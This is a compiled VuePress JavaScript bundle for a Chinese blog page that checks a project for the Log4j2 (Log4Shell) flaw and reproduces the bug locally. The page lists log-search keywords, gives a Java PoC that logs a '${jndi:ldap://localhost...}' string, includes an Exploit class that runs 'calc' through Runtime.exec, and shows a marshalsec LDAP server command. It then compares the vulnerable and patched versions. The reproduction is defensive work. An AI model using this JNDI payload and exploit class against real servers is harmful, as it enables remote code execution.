import{_ as s}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as t,c as e,a,b as p,d as o,f as c,r as l}from"./app.f386ac8b.js";const i={},r=c(`<h1 id="\u9879\u76EElog4j\u6F0F\u6D1E\u95EE\u9898\u6392\u67E5" tabindex="-1"><a class="header-anchor" href="#\u9879\u76EElog4j\u6F0F\u6D1E\u95EE\u9898\u6392\u67E5" aria-hidden="true">#</a> \u9879\u76EElog4j\u6F0F\u6D1E\u95EE\u9898\u6392\u67E5</h1><h2 id="_1-\u81EA\u68C0-\u9879\u76EE\u662F\u5426\u5B58\u5728log4g\u6F0F\u6D1E" tabindex="-1"><a class="header-anchor" href="#_1-\u81EA\u68C0-\u9879\u76EE\u662F\u5426\u5B58\u5728log4g\u6F0F\u6D1E" aria-hidden="true">#</a> 1. \u81EA\u68C0\uFF08\u9879\u76EE\u662F\u5426\u5B58\u5728log4g\u6F0F\u6D1E\uFF09</h2><p><strong>\u7ED3\u8BBA\uFF1A\u4E0D\u5B58\u5728\u8BE5\u6F0F\u6D1E</strong></p><ol><li>\u9879\u76EE\u5E76\u6CA1\u6709\u5F15\u7528\u5230log4g-core</li><li>\u4E5F\u6CA1\u6709\u6253\u5370\u4F1A\u5F15\u8D77\u8BE5\u6F0F\u6D1E\u7684\u5173\u952E\u5B57\u6216\u89C4\u5219</li></ol><p><img src="https://abelsun-1256449468.cos.ap-beijing.myqcloud.com/image/image-20211222121156841.png" alt="image-20211222121156841"></p><h3 id="_1-1-\u9488\u5BF9\u6F0F\u6D1E\u7684\u81EA\u5B9A\u4E49\u89C4\u5219" tabindex="-1"><a class="header-anchor" href="#_1-1-\u9488\u5BF9\u6F0F\u6D1E\u7684\u81EA\u5B9A\u4E49\u89C4\u5219" aria-hidden="true">#</a> 1.1 \u9488\u5BF9\u6F0F\u6D1E\u7684\u81EA\u5B9A\u4E49\u89C4\u5219</h3><table><thead><tr><th>\u89C4\u5219</th><th>\u4F7F\u7528\u60C5\u51B5</th></tr></thead><tbody><tr><td>tcp payload</td><td>\u672A\u4F7F\u7528</td></tr><tr><td>http msgbody</td><td>\u672A\u4F7F\u7528</td></tr></tbody></table><h3 id="_1-2-\u65E5\u5FD7\u6392\u67E5\u5173\u952E\u5B57" tabindex="-1"><a class="header-anchor" href="#_1-2-\u65E5\u5FD7\u6392\u67E5\u5173\u952E\u5B57" aria-hidden="true">#</a> 1.2 \u65E5\u5FD7\u6392\u67E5\u5173\u952E\u5B57</h3><table><thead><tr><th>\u5173\u952E\u5B57</th><th>\u4F7F\u7528\u60C5\u51B5</th></tr></thead><tbody><tr><td>Javax. naming Communicationexception</td><td>\u672A\u4F7F\u7528</td></tr><tr><td>Javax. naming. Namingexception: problem generating object using object factory</td><td>\u672A\u4F7F\u7528</td></tr><tr><td>Error looking up JNDI resource&quot;\u5173\u952E\u5B57\u8FDB\u884C\u6392\u67E5</td><td>\u672A\u4F7F\u7528</td></tr><tr><td>\${jndi: ladp\u6216 rmi</td><td>\u672A\u4F7F\u7528</td></tr><tr><td>getobjectfactoryfromreferenc Idapurl Context hdil ookup\u7B49\u4E0Ejnd\u8C03\u7528\u76F8\u5173\u7684\u5806\u6808\u4FE1\u606F\u3002</td><td>\u672A\u4F7F\u7528</td></tr></tbody></table><h2 id="_2-log4j\u6F0F\u6D1E\u6982\u8FF0" tabindex="-1"><a class="header-anchor" href="#_2-log4j\u6F0F\u6D1E\u6982\u8FF0" aria-hidden="true">#</a> 2. log4j\u6F0F\u6D1E\u6982\u8FF0</h2><p>\u8BE5\u6F0F\u6D1E\u662F\u7531\u4E8EApache Log4j2\u67D0\u4E9B\u529F\u80FD\u5B58\u5728\u9012\u5F52\u89E3\u6790\u529F\u80FD\uFF0C\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u653B\u51FB\u8005\u901A\u8FC7\u53D1\u9001\u7279\u5B9A\u6076\u610F\u6570\u636E\u5305\uFF0C\u53EF\u5728\u76EE\u6807\u670D\u52A1\u5668\u4E0A\u6267\u884C\u4EFB\u610F\u4EE3\u7801\u3002</p><h2 id="_3-\u5F71\u54CD\u8303\u56F4" tabindex="-1"><a class="header-anchor" href="#_3-\u5F71\u54CD\u8303\u56F4" aria-hidden="true">#</a> 3. \u5F71\u54CD\u8303\u56F4</h2><p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p><h2 id="_4-\u590D\u73B0demo" tabindex="-1"><a class="header-anchor" href="#_4-\u590D\u73B0demo" aria-hidden="true">#</a> 4. \u590D\u73B0demo</h2><h3 id="_4-1-\u65B0\u5EFAmaven\u9879\u76EE" tabindex="-1"><a class="header-anchor" href="#_4-1-\u65B0\u5EFAmaven\u9879\u76EE" aria-hidden="true">#</a> 4.1 \u65B0\u5EFAmaven\u9879\u76EE</h3><p>\u521B\u5EFA\u4E00\u4E2A\u65B0\u7684maven\u9879\u76EE\uFF0C\u5E76\u5BFC\u5165Log4j\u7684\u4F9D\u8D56\u5305</p><div class="language-xml ext-xml line-numbers-mode"><pre class="language-xml"><code> <span class="token comment">&lt;!--   bug\u7248\u672Clog4j-core-2.14.1    --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.14.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

        <span class="token comment">&lt;!--   \u5DF2\u4FEE\u590D\u7248\u672Clog4j-core-2.17.0    --&gt;</span>
<span class="token comment">&lt;!--        &lt;dependency&gt;--&gt;</span>
<span class="token comment">&lt;!--            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;--&gt;</span>
<span class="token comment">&lt;!--            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;--&gt;</span>
<span class="token comment">&lt;!--            &lt;version&gt;2.17.0&lt;/version&gt;--&gt;</span>
<span class="token comment">&lt;!--        &lt;/dependency&gt;--&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_4-2-\u6F0F\u6D1E\u5229\u7528" tabindex="-1"><a class="header-anchor" href="#_4-2-\u6F0F\u6D1E\u5229\u7528" aria-hidden="true">#</a> 4.2 \u6F0F\u6D1E\u5229\u7528</h3><h4 id="_4-2-1-\u4F7F\u7528poc\u6D4B\u8BD5" tabindex="-1"><a class="header-anchor" href="#_4-2-1-\u4F7F\u7528poc\u6D4B\u8BD5" aria-hidden="true">#</a> <strong>4.2.1 \u4F7F\u7528POC\u6D4B\u8BD5</strong></h4><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">LogTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;\${jndi:ldap://localhost:8888/Exploit}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-2-2-\u7F16\u8BD1\u4E00\u6076\u610F\u7C7Bexploit-class" tabindex="-1"><a class="header-anchor" href="#_4-2-2-\u7F16\u8BD1\u4E00\u6076\u610F\u7C7Bexploit-class" aria-hidden="true">#</a> 4.2.2 <strong>\u7F16\u8BD1\u4E00\u6076\u610F\u7C7BExploit.class</strong></h4><p>\u9996\u5148\u65B0\u5EFAexp.java\uFF0C\u7136\u540E\u7F16\u8BD1\u4E3Aclass\u6587\u4EF6</p><div class="language-java ext-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Pwned&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> cmds <span class="token operator">=</span> <span class="token string">&quot;calc&quot;</span><span class="token punctuation">;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
javac exp<span class="token punctuation">.</span>java
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-2-3-\u4F7F\u7528marshalsec-0-0-3-snapshot-all-jar\u672C\u5730\u5F00\u542F\u4E00\u4E2Aldap\u670D\u52A1" tabindex="-1"><a class="header-anchor" href="#_4-2-3-\u4F7F\u7528marshalsec-0-0-3-snapshot-all-jar\u672C\u5730\u5F00\u542F\u4E00\u4E2Aldap\u670D\u52A1" aria-hidden="true">#</a> 4.2.3 <strong>\u4F7F\u7528marshalsec-0.0.3-SNAPSHOT-all.jar\u672C\u5730\u5F00\u542F\u4E00\u4E2ALDAP\u670D\u52A1</strong></h4><div class="language-mipsasm ext-mipsasm line-numbers-mode"><pre class="language-mipsasm"><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
&quot;http://127.0.0.1:7777/#Exploit&quot; 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-2-3-\u8FD0\u884Cpoc-java-\u5373\u53EF\u8BBF\u95EE\u6076\u610F\u7C7B\u5E76\u6267\u884C\u5199\u5728\u5176\u4E2D\u7684-calc-\u547D\u4EE4" tabindex="-1"><a class="header-anchor" href="#_4-2-3-\u8FD0\u884Cpoc-java-\u5373\u53EF\u8BBF\u95EE\u6076\u610F\u7C7B\u5E76\u6267\u884C\u5199\u5728\u5176\u4E2D\u7684-calc-\u547D\u4EE4" aria-hidden="true">#</a> 4.2.3 \u8FD0\u884Cpoc.java\uFF0C\u5373\u53EF\u8BBF\u95EE\u6076\u610F\u7C7B\u5E76\u6267\u884C\u5199\u5728\u5176\u4E2D\u7684&quot;calc&quot;\u547D\u4EE4</h4><p><img src="https://abelsun-1256449468.cos.ap-beijing.myqcloud.com/image/image-20211222124406317.png" alt="image-20211222124406317"></p><h3 id="_4-3-\u9A8C\u8BC1\u6D4B\u8BD5" tabindex="-1"><a class="header-anchor" href="#_4-3-\u9A8C\u8BC1\u6D4B\u8BD5" aria-hidden="true">#</a> 4.3 \u9A8C\u8BC1\u6D4B\u8BD5</h3><h4 id="_4-3-1-bug\u7248\u672Clog4j-core-2-14-1" tabindex="-1"><a class="header-anchor" href="#_4-3-1-bug\u7248\u672Clog4j-core-2-14-1" aria-hidden="true">#</a> 4.3.1 bug\u7248\u672Clog4j-core-2.14.1</h4><p>\u6253\u5370\u7684\u65E5\u5FD7\u4F1A\u8C03\u7528jndi</p><p><img src="https://abelsun-1256449468.cos.ap-beijing.myqcloud.com/image/image-20211222124709509.png" alt="image-20211222124709509"></p><p><img src="https://abelsun-1256449468.cos.ap-beijing.myqcloud.com/image/image-20211222124917358.png" alt="image-20211222124917358"></p><h4 id="_4-3-2-\u5DF2\u4FEE\u590D\u7248\u672Clog4j-core-2-17-0" tabindex="-1"><a class="header-anchor" href="#_4-3-2-\u5DF2\u4FEE\u590D\u7248\u672Clog4j-core-2-17-0" aria-hidden="true">#</a> 4.3.2 \u5DF2\u4FEE\u590D\u7248\u672Clog4j-core-2.17.0</h4><p>\u5DF2\u4FEE\u590D\u7248\u672C\u5C31\u53D8\u6210\u5355\u7EAF\u7684\u6253\u5370\u65E5\u5FD7\u4E86</p><p><img src="https://abelsun-1256449468.cos.ap-beijing.myqcloud.com/image/image-20211222124814229.png" alt="image-20211222124814229"></p><h2 id="_5-\u9879\u76EE\u9A8C\u8BC1" tabindex="-1"><a class="header-anchor" href="#_5-\u9879\u76EE\u9A8C\u8BC1" aria-hidden="true">#</a> 5. \u9879\u76EE\u9A8C\u8BC1</h2><p>\u9879\u76EE\u5728log \u4E2D\u7684jdni\uFF0C\u5E76\u4E0D\u4F1A\u6267\u884C\u8FDC\u7A0B\u8C03\u7528</p><p><img src="https://abelsun-1256449468.cos.ap-beijing.myqcloud.com/image/image-20211222125006483.png" alt="image-20211222125006483"></p><h2 id="\u53C2\u8003\u6587\u7AE0" tabindex="-1"><a class="header-anchor" href="#\u53C2\u8003\u6587\u7AE0" aria-hidden="true">#</a> \u53C2\u8003\u6587\u7AE0</h2>`,39),d={href:"https://segmentfault.com/a/1190000041117219",target:"_blank",rel:"noopener noreferrer"};function u(g,m){const n=l("ExternalLinkIcon");return t(),e("div",null,[r,a("p",null,[a("a",d,[p("\u624B\u628A\u624B\u590D\u73B0\u4E86 Log4j2 \u6F0F\u6D1E\uFF0C\u592A\u53EF\u6015\u4E86\u3002\u3002"),o(n)])])])}const v=s(i,[["render",u],["__file","dev-lib-x-log4j-loophole.html.vue"]]);export{v as default};
